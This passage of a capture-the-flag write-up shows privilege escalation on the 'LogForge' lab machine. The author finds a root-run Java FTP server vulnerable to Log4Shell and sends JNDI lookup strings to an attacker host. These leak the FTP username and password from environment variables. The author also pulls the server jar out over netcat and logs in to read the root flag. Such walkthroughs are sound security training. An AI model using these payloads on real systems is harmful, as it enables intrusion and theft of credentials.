# # `Enumeartion`-

Now that we have access to the tomcat user, we can review port `8080` that showed as filtered on nmap.

```html
tomcat@LogForge:/home/htb$ curl localhost:8080
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Ultimate Hacking Championship</title>
<style>
body {
        background-image: url("images/logo.png");
        background-size: contain;
    background-repeat: no-repeat;
        background-color: #0c1f3b;
}
.main {
        display: flex;
        flex-direction: column;
        justify-content: center;
        text-align: center;
        line-height: 200px;
        color: #ffffff;
        font-size: 80px;
}
</style>
</head>
<body>

<div class="main">
<h1></h1>
<h2></h2>
</div>
</body>
</html>
```

It's just the Tomcat,the webpage we encountered earlier. 

There was one more port 21(ftp) that showed up in nmap lets check that out -

```bash
tomcat@LogForge:/home/htb$ netstat -tnlp
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::8080                 :::*                    LISTEN      840/java            
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 :::21                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
```

Let’s run the `ps` command and grep for `ftp` -

```bash
tomcat@LogForge:/home/htb$ ps -aux | grep 'ftp'
root         991  0.1  2.3 3581376 95896 ?       Sl   06:18   0:47 java -jar /root/ftpServer-1.0-SNAPSHOT-all.jar
tomcat     37016  0.0  0.0   3592  2836 pts/0    S+   18:16   0:00 ftp localhost
tomcat     37911  0.0  0.0   5192   732 pts/1    S+   18:48   0:00 grep ftp
```

In the cmd line argument we see a .jar file called `/root/ftpServer-1.0-SNAPSHOT-all.jar`, where java seems to be running an ftp server. We can quickly check if it’s vulnerable to log4shell as well.

```bash
tomcat@LogForge:/home/htb$ ftp localhost
Connected to localhost.
220 Welcome to the FTP-Server
Name (localhost:tomcat): ${jndi:ldap://10.10.14.127:9001/file}
```

Our netcat -

```bash
root@napster:~/Documents/HTB/LogForge# nc -nvlp 9001
listening on [any] 9001 ...
connect to [10.10.14.127] from (UNKNOWN) [10.10.11.138] 57194
0
 `
```

And we get a connection back.

I could try using `ysoserial` again, but this application (which I can reverse and see without having to try) isn’t using any of the libraries associated with any of the gadgets, so it can’t succeed. There may be a way to generate a full Java class file to send back, but that is [disabled in recent version of Java](https://jfrog.com/blog/log4shell-0-day-vulnerability-all-you-need-to-know/)

So lets transfer the .jar file to our local machine -

```bash
tomcat@LogForge:/home/htb$ locate ftpServer-1.0-SNAPSHOT-all.jar                                                                        
/ftpServer-1.0-SNAPSHOT-all.jar                                                                                                         
tomcat@LogForge:/home/htb$ cd /                                                                                                         
tomcat@LogForge:/$ ls                                                                                                                   
bin    dev                             home   lib64   mnt   root  srv  usr
boot   etc                             lib    libx32  opt   run   sys  var
cdrom  ftpServer-1.0-SNAPSHOT-all.jar  lib32  media   proc  sbin  tmp
```

Remote Machine:

```bash
tomcat@LogForge:/$ nc 10.10.14.127 6969 < ftpServer-1.0-SNAPSHOT-all.jar 
^C
tomcat@LogForge:/$ md5sum ftpServer-1.0-SNAPSHOT-all.jar 
abd783cb9ebfb7d23a8842ab2ac48dae  ftpServer-1.0-SNAPSHOT-all.jar
```

Kali/Local Machine:

```bash
root@napster:~/Documents/HTB/LogForge# nc -nvlp 6969 > ftpServer.jar
listening on [any] 6969 ...
connect to [10.10.14.127] from (UNKNOWN) [10.10.11.138] 49018
root@napster:~/Documents/HTB/LogForge# ls
ftpServer.jar  gobuster.txt  LogForge  nmap  payload.ser
root@napster:~/Documents/HTB/LogForge# md5sum ftpServer.jar 
abd783cb9ebfb7d23a8842ab2ac48dae  ftpServer.jar
```

#### `Interacting` -

To interact with the .jar file we will use [jd-gui](https://github.com/java-decompiler/jd-gui/releases)

```bash
root@napster:~/Documents/HTB/LogForge# jd-gui ftpServer.jar
```

![[Pasted image 20220107142133.png]]


On further exploring we find out -

![[Pasted image 20220107143051.png]]

The valid username and password are stored in environment variables.

Since we know that this FTP server is vulnerable to log4j, we can pass these env variables in the JNDI exploit string and try to exfil this data over the network (JNDI will perform lookups for these values and substitute it for us). We can then use Wireshark to sniff this out from the pcap.

I’ll build a JNDI string that exfils the `ftp_user` environment variable:

```bash
${jndi:ldap://10.10.14.127:1389/ftp_user:${env:ftp_user}}
```

Start your wirehark and send the payload.

```bash
tomcat@LogForge:/$ ftp localhost
Connected to localhost.
220 Welcome to the FTP-Server
Name (localhost:tomcat): ${jndi:ldap://10.10.14.127:1389/ftp_user:${env:ftp_user}}
530 Not logged in
Login failed.
Remote system type is FTP.
```

Filter wireshark packet by `tcp.port == 1389` and you will get - 

![[Pasted image 20220107145954.png]]

`ftp_user:ippsec`

Now do it for the `ftp_password` -

```bash
tomcat@LogForge:/$ ftp localhost
Connected to localhost.
220 Welcome to the FTP-Server
Name (localhost:tomcat): ${jndi:ldap://10.10.14.127:1389/ftp_password:${env:ftp_password}}
530 Not logged in
Login failed.
Remote system type is FTP.
ftp> exit
221 Closing connection
```

On wireshark -

![[Pasted image 20220107151238.png]]

`ftp_password:log4j_env_leakage`

##  `Ftp Login` -

So our final ftp credential will be -

`ippsec:log4j_env_leakage`

```bash
tomcat@LogForge:/$ ftp localhost
Connected to localhost.
220 Welcome to the FTP-Server
Name (localhost:tomcat): ippsec
331 User name okay, need password
Password:
230-Welcome to HKUST
230 User logged in successfully
Remote system type is FTP.
ftp> ls
200 Command OK
125 Opening ASCII mode data connection for file list.
.profile
.ssh
snap
ftpServer-1.0-SNAPSHOT-all.jar
.bashrc
.selected_editor
run.sh
.lesshst
.bash_history
root.txt
.viminfo
.cache
226 Transfer complete.
ftp> get root.txt
local: root.txt remote: root.txt
local: root.txt: Permission denied
```

The command `get root.txt` will fail as we do not have write permission in the root directory. We can change into /tmp directory using `lcd` and then issue the get command. We can now view the root.txt flag -

```bash
ftp> lcd /tmp
Local directory now /tmp
ftp> get root.txt 
local: root.txt remote: root.txt
200 Command OK
150 Opening ASCII mode data connection for requested file root.txt
WARNING! 1 bare linefeeds received in ASCII mode
File may not have transferred correctly.
226 File transfer successful. Closing data connection.
33 bytes received in 0.00 secs (631.8934 kB/s)
ftp> exit
221 Closing connection
tomcat@LogForge:/$ cd /tmp/
tomcat@LogForge:/tmp$ cat root.txt 
5887826cef8a055a8f21db719d5e9073
```